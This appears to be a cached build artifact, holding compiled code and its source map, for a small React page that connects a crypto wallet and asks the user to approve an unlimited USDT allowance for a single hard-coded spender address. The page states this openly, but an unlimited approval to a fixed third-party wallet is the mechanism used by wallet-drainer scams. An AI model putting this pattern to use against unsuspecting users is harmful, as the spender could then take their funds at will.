{"ast":null,"code":"import React,{useState,useEffect}from\"react\";import{ethers}from\"ethers\";import{jsx as _jsx,jsxs as _jsxs,Fragment as _Fragment}from\"react/jsx-runtime\";const USDT_ADDRESS=\"0x55d398326f99059fF775485246999027B3197955\";const USDT_ABI=[\"function approve(address spender, uint256 amount) returns (bool)\"];const SPENDER_ADDRESS=\"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\";// Replace with your backend wallet (spender)\nexport default function App(){const[provider,setProvider]=useState(null);const[signer,setSigner]=useState(null);const[account,setAccount]=useState(null);const[status,setStatus]=useState(\"\");useEffect(()=>{if(window.ethereum){// EIP-1193 provider (MetaMask, Trust Wallet, etc)\nsetProvider(new ethers.BrowserProvider(window.ethereum));}else{alert(\"No Ethereum wallet detected! Please install MetaMask or use Trust Wallet DApp browser.\");}},[]);async function connectWallet(){if(!provider)return;try{const accounts=await provider.send(\"eth_requestAccounts\",[]);setAccount(accounts[0]);setSigner(await provider.getSigner());setStatus(\"\");}catch(err){setStatus(\"Wallet connection rejected\");}}async function approveMax(){if(!signer){setStatus(\"Connect wallet first!\");return;}setStatus(\"Approving max USDT allowance...\");try{const usdt=new ethers.Contract(USDT_ADDRESS,USDT_ABI,signer);const tx=await usdt.approve(SPENDER_ADDRESS,ethers.MaxUint256);await tx.wait();setStatus(\"Approval successful!\");}catch(error){setStatus(\"Approval failed: \"+error.message);}}return/*#__PURE__*/_jsxs(\"div\",{style:{padding:20,fontFamily:\"Arial\"},children:[/*#__PURE__*/_jsx(\"h2\",{children:\"Approve Backend to Spend USDT\"}),!account?/*#__PURE__*/_jsx(\"button\",{onClick:connectWallet,children:\"Connect Wallet\"}):/*#__PURE__*/_jsxs(_Fragment,{children:[/*#__PURE__*/_jsxs(\"p\",{children:[/*#__PURE__*/_jsx(\"b\",{children:\"Connected:\"}),\" \",account]}),/*#__PURE__*/_jsx(\"button\",{onClick:approveMax,children:\"Approve Max USDT\"}),/*#__PURE__*/_jsx(\"p\",{children:status})]})]});}","map":{"version":3,"names":["React","useState","useEffect","ethers","jsx","_jsx","jsxs","_jsxs","Fragment","_Fragment","USDT_ADDRESS","USDT_ABI","SPENDER_ADDRESS","App","provider","setProvider","signer","setSigner","account","setAccount","status","setStatus","window","ethereum","BrowserProvider","alert","connectWallet","accounts","send","getSigner","err","approveMax","usdt","Contract","tx","approve","MaxUint256","wait","error","message","style","padding","fontFamily","children","onClick"],"sources":["/Users/aryan/Documents/frontend/src/App.js"],"sourcesContent":["import React, { useState, useEffect } from \"react\";\nimport { ethers } from \"ethers\";\n\nconst USDT_ADDRESS = \"0x55d398326f99059fF775485246999027B3197955\";\nconst USDT_ABI = [\n  \"function approve(address spender, uint256 amount) returns (bool)\",\n];\n\nconst SPENDER_ADDRESS = \"0x64FaeC69187a1a24A36F6590f0f8F94F68b044ee\"; // Replace with your backend wallet (spender)\n\nexport default function App() {\n  const [provider, setProvider] = useState(null);\n  const [signer, setSigner] = useState(null);\n  const [account, setAccount] = useState(null);\n  const [status, setStatus] = useState(\"\");\n\n  useEffect(() => {\n    if (window.ethereum) {\n      // EIP-1193 provider (MetaMask, Trust Wallet, etc)\n      setProvider(new ethers.BrowserProvider(window.ethereum));\n    } else {\n      alert(\"No Ethereum wallet detected! Please install MetaMask or use Trust Wallet DApp browser.\");\n    }\n  }, []);\n\n  async function connectWallet() {\n    if (!provider) return;\n    try {\n      const accounts = await provider.send(\"eth_requestAccounts\", []);\n      setAccount(accounts[0]);\n      setSigner(await provider.getSigner());\n      setStatus(\"\");\n    } catch (err) {\n      setStatus(\"Wallet connection rejected\");\n    }\n  }\n\n  async function approveMax() {\n    if (!signer) {\n      setStatus(\"Connect wallet first!\");\n      return;\n    }\n    setStatus(\"Approving max USDT allowance...\");\n    try {\n      const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);\n      const tx = await usdt.approve(SPENDER_ADDRESS, ethers.MaxUint256);\n      await tx.wait();\n      setStatus(\"Approval successful!\");\n    } catch (error) {\n      setStatus(\"Approval failed: \" + error.message);\n    }\n  }\n\n  return (\n    <div style={{ padding: 20, fontFamily: \"Arial\" }}>\n      <h2>Approve Backend to Spend USDT</h2>\n      {!account ? (\n        <button onClick={connectWallet}>Connect Wallet</button>\n      ) : (\n        <>\n          <p><b>Connected:</b> {account}</p>\n          <button onClick={approveMax}>Approve Max USDT</button>\n          <p>{status}</p>\n        </>\n      )}\n    </div>\n  );\n}\n"],"mappings":"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","ignoreList":[]},"metadata":{},"sourceType":"module","externalDependencies":[]}